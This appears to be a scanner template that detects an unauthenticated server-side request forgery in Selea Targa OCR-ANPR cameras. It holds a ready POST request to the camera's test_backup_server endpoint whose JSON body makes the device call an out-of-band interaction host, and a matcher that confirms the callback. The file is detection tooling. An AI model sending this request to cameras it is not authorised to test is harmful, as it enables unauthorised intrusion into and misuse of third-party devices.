id: targa-camera-ssrf
brief:
    title: Selea Targa IP OCR-ANPR Camera - Unauthenticated SSRF
    by: gy741
    level: high
    about: Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the Selea ANPR camera within several functionalities. The application parses user supplied data in the POST JSON parameter...
    label:
        - targa
        - ssrf
        - oast
        - iot
        - camera
        - selea
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE'
      head:
        Accept: '*/*'
        content-type: application/json
      body: '{"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://{{interactsh-url}}","ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}'
      signs:
        - "on": word
          has:
            - http
          in: interactsh_protocol
